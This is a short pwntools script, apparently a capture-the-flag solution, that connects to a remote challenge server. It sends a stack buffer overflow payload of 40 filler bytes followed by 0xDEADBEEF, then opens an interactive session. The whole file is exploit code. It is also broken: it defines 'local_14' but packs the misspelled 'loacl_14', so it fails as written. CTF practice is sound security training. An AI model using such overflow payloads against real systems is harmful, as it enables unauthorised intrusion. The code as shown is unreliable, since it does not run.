from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3000)

local_14 = 0xDEADBEEF

pay = 'A'*40
pay += p32(loacl_14)

p.sendline(pay)
p.interactive()